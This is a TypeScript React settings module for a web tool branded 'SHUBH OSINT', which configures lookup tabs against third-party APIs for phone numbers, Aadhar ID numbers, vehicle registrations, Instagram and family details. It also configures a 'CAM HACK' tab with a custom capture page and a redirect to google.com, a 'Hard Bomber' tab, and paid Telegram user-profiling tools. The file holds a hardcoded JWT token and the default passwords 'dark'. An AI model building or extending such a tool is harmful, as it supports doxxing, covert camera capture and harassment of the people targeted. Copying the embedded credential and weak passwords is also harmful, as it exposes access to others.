import { createContext, useContext, useState, useEffect, ReactNode, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";

export interface TabConfig {
  id: string;
  label: string;
  icon: string;
  color: string;
  placeholder: string;
  searchType: string;
  apiUrl: string;
  enabled: boolean;
}

export interface TelegramToolConfig {
  id: string;
  label: string;
  enabled: boolean;
  cost: string;
}

export interface TelegramOsintSettings {
  jwtToken: string;
  baseUrl: string;
  tools: TelegramToolConfig[];
}

export interface AppSettings {
  sitePassword: string;
  adminPassword: string;
  theme: "dark" | "neon-green" | "neon-pink" | "neon-cyan";
  headerName1: string;
  headerName2: string;
  headerIcon: string;
  headerCustomLogo: string;
  headerColor1: string;
  headerColor2: string;
  headerFont: string;
  headerStyle: string;
  tabs: TabConfig[];
  // DARK DB settings
  darkDbUrl: string;
  darkDbHeight: string;
  darkDbBorderColor: string;
  darkDbBorderWidth: string;
  // Background settings
  backgroundImage: string;
  backgroundOpacity: string; // 0-100, lower = more visible background
  // Telegram OSINT settings
  telegramOsint: TelegramOsintSettings;
  // CAM HACK session (synced across all devices)
  camSessionId: string;
  // CAM HACK redirect URL for normal capture
  camRedirectUrl: string;
  // Custom HTML for capture page
  customCaptureHtml: string;
  // ALL SEARCH access key
  allSearchAccessKey: string;
}

const defaultTelegramTools: TelegramToolConfig[] = [
  { id: 'basic_info', label: 'BASIC INFO', enabled: true, cost: '0.10 credit' },
  { id: 'groups', label: 'GROUPS', enabled: true, cost: '5 credits' },
  { id: 'group_count', label: 'GROUP COUNT', enabled: true, cost: 'FREE' },
  { id: 'messages_count', label: 'MESSAGES COUNT', enabled: true, cost: 'FREE' },
  { id: 'messages', label: 'MESSAGES (LIMITED)', enabled: true, cost: '10 credits' },
  { id: 'stats_min', label: 'BASIC STATS', enabled: true, cost: 'FREE' },
  { id: 'stats', label: 'FULL STATS', enabled: true, cost: '1 credit' },
  { id: 'reputation', label: 'REPUTATION', enabled: true, cost: 'FREE' },
  { id: 'resolve_username', label: 'USERNAME RESOLVE', enabled: true, cost: '0.10 credit' },
  { id: 'username_usage', label: 'USERNAME USAGE', enabled: true, cost: '0.1 credit' },
  { id: 'usernames', label: 'USERNAMES HISTORY', enabled: true, cost: '3 credits' },
  { id: 'names', label: 'NAMES HISTORY', enabled: true, cost: '3 credits' },
  { id: 'stickers', label: 'STICKERS', enabled: true, cost: '1 credit' },
  { id: 'common_groups', label: 'COMMON GROUPS', enabled: true, cost: '5 credits' },
];

const defaultTabs: TabConfig[] = [
  { id: "phone", label: "Phone", icon: "Phone", color: "green", placeholder: "Enter phone number...", searchType: "phone", apiUrl: "", enabled: true },
  { id: "aadhar", label: "Aadhar", icon: "CreditCard", color: "pink", placeholder: "Enter Aadhar number...", searchType: "aadhar", apiUrl: "", enabled: true },
  { id: "vehicle", label: "Vehicle", icon: "Car", color: "orange", placeholder: "Enter RC number...", searchType: "vehicle", apiUrl: "https://darknagi-osint-vehicle-api.vercel.app/api/vehicle?rc=", enabled: true },
  { id: "instagram", label: "Instagram", icon: "Camera", color: "cyan", placeholder: "Enter username...", searchType: "instagram", apiUrl: "", enabled: true },
  { id: "family", label: "Family", icon: "Users", color: "purple", placeholder: "Enter name/number...", searchType: "family", apiUrl: "", enabled: true },
  { id: "manual", label: "Manual", icon: "ClipboardPaste", color: "yellow", placeholder: "Enter number...", searchType: "manual", apiUrl: "https://hydrashop.in.net/number.php?q=", enabled: true },
  { id: "shubh", label: "CAM HACK", icon: "Sparkles", color: "cyan", placeholder: "", searchType: "shubh", apiUrl: "", enabled: true },
  { id: "darkdb", label: "Hard Bomber", icon: "Database", color: "purple", placeholder: "", searchType: "darkdb", apiUrl: "https://2info.vercel.app", enabled: true },
  { id: "telegram", label: "Telegram OSI", icon: "Send", color: "cyan", placeholder: "", searchType: "telegram", apiUrl: "", enabled: true },
  { id: "allsearch", label: "All Search", icon: "Globe", color: "red", placeholder: "Enter phone / email / name...", searchType: "allsearch", apiUrl: "https://lek-steel.vercel.app/api/search?q=", enabled: true },
];

const defaultSettings: AppSettings = {
  sitePassword: "dark",
  adminPassword: "dark",
  theme: "dark",
  headerName1: "SHUBH",
  headerName2: "OSINT",
  headerIcon: "Zap",
  headerCustomLogo: "",
  headerColor1: "green",
  headerColor2: "pink",
  headerFont: "Orbitron",
  headerStyle: "normal",
  tabs: defaultTabs,
  // DARK DB defaults
  darkDbUrl: "https://shubhinfo.vercel.app/",
  darkDbHeight: "70",
  darkDbBorderColor: "purple",
  darkDbBorderWidth: "2",
  // Background defaults
  backgroundImage: "",
  backgroundOpacity: "30", // 30% overlay = 70% visible
  // Telegram OSINT defaults
  telegramOsint: {
    jwtToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI4MjcwODU1NTI3IiwianRpIjoiNDhiMmFjODktN2VkZS00NTRlLWE5MjAtODE0Nzg0OGEzYWE0IiwiZXhwIjoxNzk3NDQ0NjQ0fQ.SToaZbha-xTT5WDeJrUFoSzgmCVuBKxHVR6mpvGcwjUPXxcfWQFLqwOlqUtO99r9rRnR_ZNd229rg_qbLxUKLdQhQCeHYgwr-fDhesy0QwKJBLCE34hvDXjD9F1_SEsrynx-hBGBKWlZ13MjkYwSQs_vjm7WobIeY9MSMykzp1E",
    baseUrl: "https://funstat.info",
    tools: defaultTelegramTools,
  },
  // CAM HACK session - fixed session ID synced across all devices
  camSessionId: "shubhcam01",
  // CAM HACK redirect URL
  camRedirectUrl: "https://google.com",
  // Custom HTML for capture page
  // ALL SEARCH access key (default empty means no protection)
  allSearchAccessKey: "darkosint",
  customCaptureHtml: "",
};

interface SettingsContextType {
  settings: AppSettings;
  updateSettings: (newSettings: Partial<AppSettings>) => void;
  updateTab: (tabId: string, updates: Partial<TabConfig>) => void;
  updateTelegramTool: (toolId: string, updates: Partial<TelegramToolConfig>) => void;
  resetSettings: () => void;
}

const SettingsContext = createContext<SettingsContextType | undefined>(undefined);

export const SettingsProvider = ({ children }: { children: ReactNode }) => {
  const [settings, setSettings] = useState<AppSettings>(defaultSettings);
  const [isLoaded, setIsLoaded] = useState(false);

  // Load settings from Supabase on mount
  useEffect(() => {
    const loadSettings = async () => {
      try {
        const { data, error } = await supabase
          .from('app_settings')
          .select('setting_value')
          .eq('setting_key', 'main_settings')
          .maybeSingle();

        if (error) {
          console.error('Error loading settings:', error);
          // Fall back to localStorage
          const saved = localStorage.getItem("app_settings");
          if (saved) {
            const parsed = JSON.parse(saved);
            const savedTabIds = parsed.tabs?.map((t: TabConfig) => t.id) || [];
            const newTabs = defaultTabs.filter(t => !savedTabIds.includes(t.id));
            const mergedTabs = [...(parsed.tabs || []), ...newTabs];
            setSettings({ ...defaultSettings, ...parsed, tabs: mergedTabs });
          }
        } else if (data) {
          const parsed = data.setting_value as unknown as AppSettings;
          const savedTabIds = parsed.tabs?.map((t: TabConfig) => t.id) || [];
          const newTabs = defaultTabs.filter(t => !savedTabIds.includes(t.id));
          const mergedTabs = [...(parsed.tabs || []), ...newTabs];
          setSettings({ ...defaultSettings, ...parsed, tabs: mergedTabs });
        }
      } catch (err) {
        console.error('Error loading settings:', err);
      } finally {
        setIsLoaded(true);
      }
    };

    loadSettings();
  }, []);

  // Save settings to Supabase whenever they change
  const saveToSupabase = useCallback(async (newSettings: AppSettings) => {
    try {
      const settingsJson = JSON.parse(JSON.stringify(newSettings));
      
      const { data: existing } = await supabase
        .from('app_settings')
        .select('id')
        .eq('setting_key', 'main_settings')
        .maybeSingle();

      if (existing) {
        await supabase
          .from('app_settings')
          .update({ setting_value: settingsJson })
          .eq('setting_key', 'main_settings');
      } else {
        await supabase
          .from('app_settings')
          .insert([{ setting_key: 'main_settings', setting_value: settingsJson }]);
      }
      
      // Also save to localStorage as backup
      localStorage.setItem("app_settings", JSON.stringify(newSettings));
    } catch (err) {
      console.error('Error saving settings:', err);
    }
  }, []);

  const updateSettings = (newSettings: Partial<AppSettings>) => {
    setSettings(prev => {
      const updated = { ...prev, ...newSettings };
      saveToSupabase(updated);
      return updated;
    });
  };

  const updateTab = (tabId: string, updates: Partial<TabConfig>) => {
    setSettings(prev => {
      const updated = {
        ...prev,
        tabs: prev.tabs.map(tab => 
          tab.id === tabId ? { ...tab, ...updates } : tab
        ),
      };
      saveToSupabase(updated);
      return updated;
    });
  };

  const updateTelegramTool = (toolId: string, updates: Partial<TelegramToolConfig>) => {
    setSettings(prev => {
      const updated = {
        ...prev,
        telegramOsint: {
          ...prev.telegramOsint,
          tools: prev.telegramOsint.tools.map(tool =>
            tool.id === toolId ? { ...tool, ...updates } : tool
          ),
        },
      };
      saveToSupabase(updated);
      return updated;
    });
  };

  const resetSettings = async () => {
    setSettings(defaultSettings);
    localStorage.removeItem("app_settings");
    
    // Delete from Supabase
    await supabase
      .from('app_settings')
      .delete()
      .eq('setting_key', 'main_settings');
  };

  return (
    <SettingsContext.Provider value={{ settings, updateSettings, updateTab, updateTelegramTool, resetSettings }}>
      {children}
    </SettingsContext.Provider>
  );
};

export const useSettings = () => {
  const context = useContext(SettingsContext);
  if (!context) {
    throw new Error("useSettings must be used within SettingsProvider");
  }
  return context;
};
